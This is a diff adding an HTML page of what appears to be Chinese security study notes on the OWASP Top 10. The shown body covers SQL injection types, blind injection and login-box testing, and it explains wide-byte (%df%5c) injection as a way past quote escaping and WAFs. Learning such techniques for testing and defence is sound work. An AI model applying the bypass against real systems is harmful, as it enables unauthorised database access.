@@ -1,0 +1,1625 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>hvv_OWASP_TOP10 - Sc0fie1d-Blog</title><meta name="Description" content="The official documentation for the Hugo DoIt theme"><meta property="og:title" content="hvv_OWASP_TOP10" />
+<meta property="og:description" content="TOP10漏洞 1 2 3 4 5 6 7 8 9 10 1、SQL注入 2、失效的身份认证和会话管理 3、跨站脚本攻击XSS 4、直接引用不安全的对象 5、安全配置错误 6、敏感信息泄露 7、缺少功能级的访问控制 8、跨站请求伪造CSRF 9、使用含有已知漏洞的组件 10、未验证的重定向和转发 常见web漏洞0.1 01-SQL注入漏洞0.1.1 1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。
+0.1.2 2.分类0.1.2.1 (1)注入点的不同分类●数字类型的注入 ●字符串类型的注入
+0.1.2.2 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入
+0.1.2.3 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。
+●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。
+●基于报错的注入
+●二次注入
+●宽字节注入
+有些waf会在我们的提交数据前会被加入\，\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义
+●盲注和延时注入的共同点？ 都是一个字符一个字符的判断
+0.1.3 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果
+0.1.4 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 0." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/hvv_owasptop10/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+
+<meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="hvv_OWASP_TOP10"/>
+<meta name="twitter:description" content="TOP10漏洞 1 2 3 4 5 6 7 8 9 10 1、SQL注入 2、失效的身份认证和会话管理 3、跨站脚本攻击XSS 4、直接引用不安全的对象 5、安全配置错误 6、敏感信息泄露 7、缺少功能级的访问控制 8、跨站请求伪造CSRF 9、使用含有已知漏洞的组件 10、未验证的重定向和转发 常见web漏洞0.1 01-SQL注入漏洞0.1.1 1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。
+0.1.2 2.分类0.1.2.1 (1)注入点的不同分类●数字类型的注入 ●字符串类型的注入
+0.1.2.2 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入
+0.1.2.3 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。
+●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。
+●基于报错的注入
+●二次注入
+●宽字节注入
+有些waf会在我们的提交数据前会被加入\，\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义
+●盲注和延时注入的共同点？ 都是一个字符一个字符的判断
+0.1.3 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果
+0.1.4 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 0."/>
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/hvv_owasptop10/" /><link rel="prev" href="http://scofield1920.github.io/hvv_middleware_bug/" /><link rel="next" href="http://scofield1920.github.io/hvv_java/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "hvv_OWASP_TOP10",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/hvv_owasptop10\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "hvv, web","wordcount":  1295 ,
+        "url": "http:\/\/scofield1920.github.io\/hvv_owasptop10\/","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "scofied_lee"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d-Blog"><img
+        class="logo"
+        loading="lazy"
+        src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 2x"
+        sizes="auto"
+        alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" ><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d-Blog"><img
+        class="logo"
+        loading="lazy"
+        src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 2x"
+        sizes="auto"
+        alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" ><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#01-sql注入漏洞">01-SQL注入漏洞</a>
+          <ul>
+            <li><a href="#1原理">1.原理</a></li>
+            <li><a href="#2分类">2.分类</a>
+              <ul>
+                <li><a href="#1注入点的不同分类">(1)注入点的不同分类</a></li>
+                <li><a href="#2提交方式的不同分类">(2)提交方式的不同分类</a></li>
+                <li><a href="#3获取信息的方式不同分类">(3)获取信息的方式不同分类</a></li>
+              </ul>
+            </li>
+            <li><a href="#3盲注原理">3.盲注原理</a></li>
+            <li><a href="#4一个登录框怎么测试">4.一个登录框怎么测试</a></li>
+            <li><a href="#5报错注入的函数有哪些">5.报错注入的函数有哪些？</a></li>
+            <li><a href="#6sql-注入无回显的情况下利用-dnslogmysql-下利用什么构造代码mssql-下又如何构造">6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？</a></li>
+            <li><a href="#7sql注入时-and-or-被过滤怎办">7.SQL注入时 and or 被过滤怎办？</a></li>
+            <li><a href="#8sql注入过滤逗号如何处理">8.SQL注入过滤逗号如何处理</a></li>
+            <li><a href="#9sql-注入绕过-waf的-方法">9.sql 注入绕过 WAF的 方法？</a></li>
+            <li><a href="#10sql注入的告警的流量特征看哪些方面">10.sql注入的告警的流量特征看哪些方面？</a></li>
+            <li><a href="#11sql写入shell的两个函数">11.sql写入shell的两个函数</a></li>
+            <li><a href="#12sqlmap的--os-shell原理">12.sqlmap的&ndash;os-shell原理</a></li>
+            <li><a href="#13sql写入shell的条件">13.sql写入shell的条件</a></li>
+            <li><a href="#14找绝对路径的方法">14.找绝对路径的方法</a></li>
+            <li><a href="#15sqlmap中risk和levels区别">15.sqlmap中risk和levels区别</a></li>
+            <li><a href="#16数据库全局日志写入">16.数据库全局日志写入</a></li>
+            <li><a href="#17数据库慢查询日志写入">17.数据库慢查询日志写入</a></li>
+            <li><a href="#18mysql-在渗透测试中的利用">18.Mysql 在渗透测试中的利用</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#02-xss漏洞">02-xss漏洞</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1原理-1">1.原理</a></li>
+            <li><a href="#2分类-1">2.分类：</a></li>
+            <li><a href="#3危害">3.危害</a></li>
+            <li><a href="#4防御">4.防御：</a></li>
+            <li><a href="#5如何快速判定xss类型">5.如何快速判定XSS类型？</a></li>
+            <li><a href="#6存储型xss怎么利用">6.存储型XSS怎么利用</a></li>
+            <li><a href="#7cors浏览器同源策略">7.CORS（浏览器同源策略）</a></li>
+            <li><a href="#8xss绕过waf总结">8.XSS绕过waf总结</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#03-csrf漏洞">03-csrf漏洞</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1原理-2">1.原理：</a></li>
+            <li><a href="#2形成原因">2.形成原因：</a></li>
+            <li><a href="#3如何防止-csrf">3.如何防止 CSRF?</a></li>
+            <li><a href="#4csrf成功利用的条件">4.csrf成功利用的条件</a></li>
+            <li><a href="#5xss和csrf的区别">5.XSS和CSRF的区别</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#04-ssrf漏洞">04-ssrf漏洞</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1原理-3">1.原理</a></li>
+            <li><a href="#2防御">2.防御：</a></li>
+            <li><a href="#3ssrf-禁用-127001-后如何绕过支持哪些协议">3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？</a></li>
+            <li><a href="#4漏洞存在的地方">4.漏洞存在的地方：</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#05-文件上传漏洞">05-文件上传漏洞：</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1文件上传原理">1.文件上传原理</a></li>
+            <li><a href="#2漏洞原理">2.漏洞原理：</a></li>
+            <li><a href="#3攻击特征">3.攻击特征</a></li>
+            <li><a href="#4需满足条件">4.需满足条件</a></li>
+            <li><a href="#5数据包中可修改的地方">5.数据包中可修改的地方</a></li>
+            <li><a href="#6waf如何拦截恶意文件">6.waf如何拦截恶意文件</a></li>
+            <li><a href="#7绕过">7.绕过</a>
+              <ul>
+                <li><a href="#黑名单绕过">黑名单绕过</a></li>
+                <li><a href="#白名单绕过">白名单绕过</a></li>
+                <li><a href="#字符变异">字符变异</a>
+                  <ul>
+                    <li><a href="#引号变换">引号变换</a></li>
+                    <li><a href="#大小写变换">大小写变换</a></li>
+                    <li><a href="#添加换行符">添加换行符</a></li>
+                    <li><a href="#多个分号">多个分号</a></li>
+                    <li><a href="#多个等号">多个等号</a></li>
+                  </ul>
+                </li>
+                <li><a href="#变换content-disposition的值">变换Content-Disposition的值</a>
+                  <ul>
+                    <li><a href="#畸形的boundary头部">畸形的boundary头部</a></li>
+                    <li><a href="#顺序颠倒">顺序颠倒</a></li>
+                    <li><a href="#内容重复">内容重复</a></li>
+                    <li><a href="#数据溢出"><strong>数据溢出</strong></a></li>
+                    <li><a href="#数据截断">数据截断</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#8利用sessionupload_progress">8.利用session.upload_progress</a>
+              <ul>
+                <li><a href="#条件">条件</a></li>
+                <li><a href="#使用方法">使用方法</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#06-xxe">06-XXE</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1原理-4">1.原理</a></li>
+            <li><a href="#2防御-1">2.防御</a></li>
+            <li><a href="#3关键词">3.关键词：</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">hvv_OWASP_TOP10</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">scofied_lee</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/hvv/"><i class="far fa-folder fa-fw"></i>hvv</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1295 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#01-sql注入漏洞">01-SQL注入漏洞</a>
+          <ul>
+            <li><a href="#1原理">1.原理</a></li>
+            <li><a href="#2分类">2.分类</a>
+              <ul>
+                <li><a href="#1注入点的不同分类">(1)注入点的不同分类</a></li>
+                <li><a href="#2提交方式的不同分类">(2)提交方式的不同分类</a></li>
+                <li><a href="#3获取信息的方式不同分类">(3)获取信息的方式不同分类</a></li>
+              </ul>
+            </li>
+            <li><a href="#3盲注原理">3.盲注原理</a></li>
+            <li><a href="#4一个登录框怎么测试">4.一个登录框怎么测试</a></li>
+            <li><a href="#5报错注入的函数有哪些">5.报错注入的函数有哪些？</a></li>
+            <li><a href="#6sql-注入无回显的情况下利用-dnslogmysql-下利用什么构造代码mssql-下又如何构造">6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？</a></li>
+            <li><a href="#7sql注入时-and-or-被过滤怎办">7.SQL注入时 and or 被过滤怎办？</a></li>
+            <li><a href="#8sql注入过滤逗号如何处理">8.SQL注入过滤逗号如何处理</a></li>
+            <li><a href="#9sql-注入绕过-waf的-方法">9.sql 注入绕过 WAF的 方法？</a></li>
+            <li><a href="#10sql注入的告警的流量特征看哪些方面">10.sql注入的告警的流量特征看哪些方面？</a></li>
+            <li><a href="#11sql写入shell的两个函数">11.sql写入shell的两个函数</a></li>
+            <li><a href="#12sqlmap的--os-shell原理">12.sqlmap的&ndash;os-shell原理</a></li>
+            <li><a href="#13sql写入shell的条件">13.sql写入shell的条件</a></li>
+            <li><a href="#14找绝对路径的方法">14.找绝对路径的方法</a></li>
+            <li><a href="#15sqlmap中risk和levels区别">15.sqlmap中risk和levels区别</a></li>
+            <li><a href="#16数据库全局日志写入">16.数据库全局日志写入</a></li>
+            <li><a href="#17数据库慢查询日志写入">17.数据库慢查询日志写入</a></li>
+            <li><a href="#18mysql-在渗透测试中的利用">18.Mysql 在渗透测试中的利用</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#02-xss漏洞">02-xss漏洞</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1原理-1">1.原理</a></li>
+            <li><a href="#2分类-1">2.分类：</a></li>
+            <li><a href="#3危害">3.危害</a></li>
+            <li><a href="#4防御">4.防御：</a></li>
+            <li><a href="#5如何快速判定xss类型">5.如何快速判定XSS类型？</a></li>
+            <li><a href="#6存储型xss怎么利用">6.存储型XSS怎么利用</a></li>
+            <li><a href="#7cors浏览器同源策略">7.CORS（浏览器同源策略）</a></li>
+            <li><a href="#8xss绕过waf总结">8.XSS绕过waf总结</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#03-csrf漏洞">03-csrf漏洞</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1原理-2">1.原理：</a></li>
+            <li><a href="#2形成原因">2.形成原因：</a></li>
+            <li><a href="#3如何防止-csrf">3.如何防止 CSRF?</a></li>
+            <li><a href="#4csrf成功利用的条件">4.csrf成功利用的条件</a></li>
+            <li><a href="#5xss和csrf的区别">5.XSS和CSRF的区别</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#04-ssrf漏洞">04-ssrf漏洞</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1原理-3">1.原理</a></li>
+            <li><a href="#2防御">2.防御：</a></li>
+            <li><a href="#3ssrf-禁用-127001-后如何绕过支持哪些协议">3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？</a></li>
+            <li><a href="#4漏洞存在的地方">4.漏洞存在的地方：</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#05-文件上传漏洞">05-文件上传漏洞：</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1文件上传原理">1.文件上传原理</a></li>
+            <li><a href="#2漏洞原理">2.漏洞原理：</a></li>
+            <li><a href="#3攻击特征">3.攻击特征</a></li>
+            <li><a href="#4需满足条件">4.需满足条件</a></li>
+            <li><a href="#5数据包中可修改的地方">5.数据包中可修改的地方</a></li>
+            <li><a href="#6waf如何拦截恶意文件">6.waf如何拦截恶意文件</a></li>
+            <li><a href="#7绕过">7.绕过</a>
+              <ul>
+                <li><a href="#黑名单绕过">黑名单绕过</a></li>
+                <li><a href="#白名单绕过">白名单绕过</a></li>
+                <li><a href="#字符变异">字符变异</a>
+                  <ul>
+                    <li><a href="#引号变换">引号变换</a></li>
+                    <li><a href="#大小写变换">大小写变换</a></li>
+                    <li><a href="#添加换行符">添加换行符</a></li>
+                    <li><a href="#多个分号">多个分号</a></li>
+                    <li><a href="#多个等号">多个等号</a></li>
+                  </ul>
+                </li>
+                <li><a href="#变换content-disposition的值">变换Content-Disposition的值</a>
+                  <ul>
+                    <li><a href="#畸形的boundary头部">畸形的boundary头部</a></li>
+                    <li><a href="#顺序颠倒">顺序颠倒</a></li>
+                    <li><a href="#内容重复">内容重复</a></li>
+                    <li><a href="#数据溢出"><strong>数据溢出</strong></a></li>
+                    <li><a href="#数据截断">数据截断</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#8利用sessionupload_progress">8.利用session.upload_progress</a>
+              <ul>
+                <li><a href="#条件">条件</a></li>
+                <li><a href="#使用方法">使用方法</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#06-xxe">06-XXE</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1原理-4">1.原理</a></li>
+            <li><a href="#2防御-1">2.防御</a></li>
+            <li><a href="#3关键词">3.关键词：</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="top10漏洞" class="headerLink">
+    <a href="#top10%e6%bc%8f%e6%b4%9e" class="header-mark"></a>TOP10漏洞</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1、SQL注入 
+</span></span><span class="line"><span class="cl">2、失效的身份认证和会话管理
+</span></span><span class="line"><span class="cl">3、跨站脚本攻击XSS
+</span></span><span class="line"><span class="cl">4、直接引用不安全的对象
+</span></span><span class="line"><span class="cl">5、安全配置错误
+</span></span><span class="line"><span class="cl">6、敏感信息泄露
+</span></span><span class="line"><span class="cl">7、缺少功能级的访问控制
+</span></span><span class="line"><span class="cl">8、跨站请求伪造CSRF
+</span></span><span class="line"><span class="cl">9、使用含有已知漏洞的组件
+</span></span><span class="line"><span class="cl">10、未验证的重定向和转发
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="常见web漏洞" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%81web%e6%bc%8f%e6%b4%9e" class="header-mark"></a>常见web漏洞</h1><h3 id="01-sql注入漏洞" class="headerLink">
+    <a href="#01-sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e" class="header-mark"></a>0.1 01-SQL注入漏洞</h3><h4 id="1原理" class="headerLink">
+    <a href="#1%e5%8e%9f%e7%90%86" class="header-mark"></a>0.1.1 1.原理</h4><p>SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。</p>
+<h4 id="2分类" class="headerLink">
+    <a href="#2%e5%88%86%e7%b1%bb" class="header-mark"></a>0.1.2 2.分类</h4><h5 id="1注入点的不同分类" class="headerLink">
+    <a href="#1%e6%b3%a8%e5%85%a5%e7%82%b9%e7%9a%84%e4%b8%8d%e5%90%8c%e5%88%86%e7%b1%bb" class="header-mark"></a>0.1.2.1 (1)注入点的不同分类</h5><p>●数字类型的注入
+●字符串类型的注入</p>
+<h5 id="2提交方式的不同分类" class="headerLink">
